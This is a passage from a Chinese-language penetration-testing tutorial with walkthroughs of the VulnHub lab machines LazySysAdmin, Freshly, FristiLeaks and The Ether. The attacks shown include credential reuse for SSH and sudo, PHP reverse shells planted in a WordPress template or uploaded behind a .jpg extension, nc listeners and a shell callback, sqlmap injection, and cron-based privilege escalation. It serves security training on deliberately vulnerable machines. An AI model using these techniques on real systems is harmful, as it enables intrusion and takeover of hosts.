发现两个关键的文件deets.txt和wp-config.php
尝试用上面获取的mysql账号密码去登录phpmyadmin，但是发现没一个表项可以查看。
5
另外，上面还有一个密码是12345，而且之前登录WordPress页面的时候，页面显示 My name is togie. ，所以可
以用账号： togie 密码： 12345 尝试登录ssh，发现可以成功登录。
togie@LazySysAdmin:~$ whoami
togie
togie@LazySysAdmin:~$ id
uid=1000(togie) gid=1000(togie)
groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
togie@LazySysAdmin:~$ sudo su
[sudo] password for togie:
root@LazySysAdmin:/home/togie# id
uid=0(root) gid=0(root) groups=0(root)
有了root权限，就有权限查看目标文件/root/proof.txt，这样就算完成了整个游戏了。这里刚好togie有root权限，
所以尝试直接用sudo su切换到root权限，但是如果togie没有root权限，就需要通过其他方式来提权了。
思路二
通过账号： Admin 密码： TogieMYSQL12345^^ 登录WordPress控制面板，向404.php页面模板插入PHP反弹shell
的代码。
编辑好后，点击下面的upload file应用，然后访问http://192.168.0.100/wordpress/?p=2
root@kali:~# nc -vlp 1234
listening on [any] 1234 ...
192.168.0.100: inverse host lookup failed: Unknown host
connect to [192.168.0.109] from (UNKNOWN) [192.168.0.100] 36468
Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686
i686 i686 GNU/Linux
16:03:42 up 6 min, 0 users, load average: 0.01, 0.15, 0.11
USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ sudo su
sudo: no tty present and no askpass program specified
出现no tty present and no askpass program specified，刚好目标机有python环境，使用python派生个新的
shell。
python -c 'import pty; pty.spawn("/bin/sh")'
但是不知道www-data的密码，所以接下来就要进行提权，先来看一下目标机的详细信息
$ uname -r
4.4.0-31-generic
$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description: Ubuntu 14.04.5 LTS
Release: 14.04
Codename: trusty
所以用CVE-2017-1000112提权即可，但是目标机上没有gcc，这种情况，可以本地搭建和目标机一样的环境，在本
地编译好提权exp后，在目标机器上运行即可。
dirb安装方法（kali已自带）
wget https://svwh.dl.sourceforge.net/project/dirb/dirb/2.22/dirb222.tar.gz
tar zxvf dirb222.tar.gz
cd dirb222/
apt-get install libcurl4-gnutls-dev
./configure && make
./dirb #运行即可
参考链接：
VulnHub Walk-through – LazySysAdmin: 1
LazySysAdmin Vulnerable Machine Walk-through
第六节 Freshly
Vulnhub-TopHatSec: Freshly
靶机简介
下载链接
https://download.vulnhub.com/tophatsec/Freshly.ova
运行环境
Virtualbox
VM（运行会提示错误，给的解决链接已经404）
本靶机推荐使用Virtualbox搭建
说明
此靶机的目标是通过网络渗透进主机，并找到隐藏在敏感文件中的秘密。
运行环境
将下载的OVA文件导入进Virtualbox即可。
渗透思路
服务发现
端口扫描
操作系统识别
主要端口进一步扫描
80端口
8080
发现8080和443端口均为Web，使用了WordPress。
检测已知服务
对wordpress进行扫描
发现三个插件有安全问题，但是对进一步渗透帮助不大。在扫描同时，使用 nikto 对80进行目录扫描，发现
phpmyadmin和login.php
login.php
Sqlmap进行检测
存在注入
查看数据库
查看WordPress8080库找到wordpress的用户名和密码
登入后台，修改语言为中文
获取shell
wordpress有两种方式拿shell，一种是添加插件，将准备好的格式正确的shell添加到.zip上传。
还有一种是直接编辑
这里采用直接编辑的方式getshell。将shell写入404页面
本地开NC监听
访问404页面 Shell反弹
查看passwd
第七节 FristiLeaks v1.3
靶机信息
下载连接
https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova.torrent https://download.vulnhub.com/fristilea
ks/FristiLeaks_1.3.ova
运行环境
Virtualbox （二选一)
Vnware Workstation player
设置
根据官网提供的说明，首先要将要求设置VMware虚拟机的MAC地址 08:00:27:A5:A6:76
然后开启VM
主机发现
Netdiscover –r 10.10.10.0/24
可以发现目标主机在10.10.10.132的位置
服务发现
nmap -sS -Pn -T4 -p- 10.10.10.132
可以看到打开了80端口，service为HTTP
详细扫描80端口
仅发现开放了80端口，对80端口进行详细探测：
nmap -A -O -p80 10.10.10.132
得到以下有价值的信息：
Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
http-robots.txt: 3 disallowed entries
浏览一下web站点
根据nmap扫描的结果存在 robots.txt 文件，查看一下：
访问以下 robots.txt 提到的三个路径
三个目录内容相同，只有以上画面。
接着，枚举一下目录：
dirb http://10.10.10.132
在 images 目录发现几张照片：
查看图片， keep-calm 似乎是一个提示
KEEP CALM AND DRINK FRISTI
尝试访问 http://10.10.10.132/fristi/
发现一个登陆口。登录界面存在一个严重安全问题，两个输入框都有自动完成的功能。（包括密码）
扫描一下该目录：
dirb http://10.10.10.132/fristi/
发现了 upload 目录的index页面
查看源代码发现线索：
注释当中的信息表明，此页面是一个叫eezeepz的人留下来的。
推测， eezeepz 或许是账号或者密码
继续向下，发现一大块用base64编码的字符串
复制，写入一个文件，之后使用命令解码：
base64 -d /tmp/encoded.txt
根据文件格式，这是一个PNG格式的图画，保存为PNG格式
base64 -d /tmp/encoded.txt > decoded.png
查看发现一串字符串
尝试使用以上获取的信息进行登录：
username:eezeepz
password:keKkeKKeKKeKkEkkEk
登陆成功，发现文件上传。此上传点未做任何过滤，可以直接上传shell文件。
反弹Shell的脚本木马可以在这里下载：http://pentestmonkey.net/tools/web-shells/php-reverse-shell
cp /usr/share/webshells/php/php-reverse-shell.php reverse-shell.php
vi reverse-shell.php
修改反弹shell的ip地址和监听端口。
使用 nc 监听端口：
nc -nlvp 8888
根据回显，只有png, jpg, gif 能上传
修改一下文件名，后缀加上 .jpg
上传成功，打开上传的shell：
现在已经得到了一个低端权限
权限提升
翻看一下目录，在 home 目录
看到关键人物eezeepz的家目录
在 notes.txt 当中得到提示：
根据提示说明，在/tmp下创建一个 runtis 文件
赋予权限
根据 notes.txt 的提示，在 /tmp/runtis 当中写入的命令会定时执行，那么，修改 /home/admin 目录的权限。
等待系统执行命令之后，就可以阅读 /home/admin 下的内容了
有几个文件。依次看一下。
cryptpass.py
Cryptepass.txt
whoisyourgodnow.txt
看样子应该是用了py文件去加密的。 重写一下文件：
解密试试
分别得到
1.mVGZ3O3omkJLmy2pcuTq ：thisisalsopw123
2.=RFn0AKnlMHMPIzpyuTI0ITG ：LetThereBeFristi!
这有可能是用户fristgod 的密码，组合试试
根据报错信息，查了资料： 跟 su 命令的实现有关； B环境上su的实现应该是判断标准输入是不是tty ； 而A环境上
su的实现则允许从其他文件读取密码。
解决方法如下：
Python -c 'import pty;pty.spawn("/bin/sh")'
接下来就可以正常使用了。
查看一下目录文件：
查看 .secret_admin_stuff 目录文件：
发现这个是个root的文件 权限应该是不够的
查看命令使用记录， history 命令执行结果：
可以看到 fristigod 用户一直sudo来执行命令
尝试输入之前得到的两个密码：
成功登陆：
使用 sudo 提升权限，并创建一个shell：
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
直接查看/root下的文件
读取flag文件，得到flag
第八节 The Ether
靶机信息
下载链接
http://www.mediafire.com/file/502nbnbkarsoisb/theEther.zip
运行环境
本靶机提供了VMware的镜像，从Vulnhub下载之后解压，运行 vmx 文件即可
靶机：本靶机默认使用了自动获取的上网模式。运行靶机之后，将会桥接到物理网卡，接入网络。
攻击机：Kali虚拟机运行于virtualbox，同样使用桥接模式，即可访问靶机。
靶机说明
本靶机有一定难度，不适合初学者。
本靶机的渗透目标为渗透进靶机并且找到系统中隐藏的Flag值。
官方提供了一个提示：靶机中有一个相关的文件，在渗透过程中发挥重要作用，但是不要浪费时间试图去解密这个
混淆后的文件。
信息收集
ip发现
首先看一下Kali的网络配置。
之后使用fping发现靶机。 fping -asg 192.168.1.0/24 发现有本网段有四个相关IP。
端口扫描与服务识别
使用nmap快速扫描选项（ -F 参数）扫描 192.168.1.0/24 网段
根据 Mac 可以很明显的区分， 192.168.1.1 为TP-Link路由器， 192.168.1.100 为苹果设备， 192.168.1.101 为
VMware虚拟机。可以确定 192.168.1.101 为目标靶机的IP。
确定目标IP之后，使用Nmap对目标进行更加详细的探测： nmap -A -v 192.168.1.101 -oN nmap.txt
解释一下相关参数：
-A 详细扫描目标IP，加载所有脚本，尽可能全面的探测信息；
-v 显示详细的扫描过程；
-oN 将扫描结果以普通文本的格式输出到 nmap.txt 。
结果如下：
威胁建模
分析nmap的扫描结果，发现靶机只开放了 22 和 80 端口，系统为 Ubuntu 。 22 端口为 SSH 服务， 80 端口为
http 服务，Web容器为 Apache/2.4.18 。
通常Web会存在各种各样的问题，经过初步分析，以Web作为初步的渗透入口。
Web漏洞挖掘
1. 使用niktoWeb漏洞扫描器
使用nikto工具扫描Web漏洞， nikto -h 192.168.1.101 ， -h 参数指定扫描目标。
没有发现什么明显的高危漏洞，发现了 images 目录和 /icons/README 文件，没有什么利用价值。
2. 使用dirb扫描网站目录
dirb http://192.168.1.101
除了部分静态文件，没有发现有价值的利用点。
3. 浏览网站功能
根据前两步基本的信息探测，并没有发现漏洞点。手动访问网站，分析网站功能。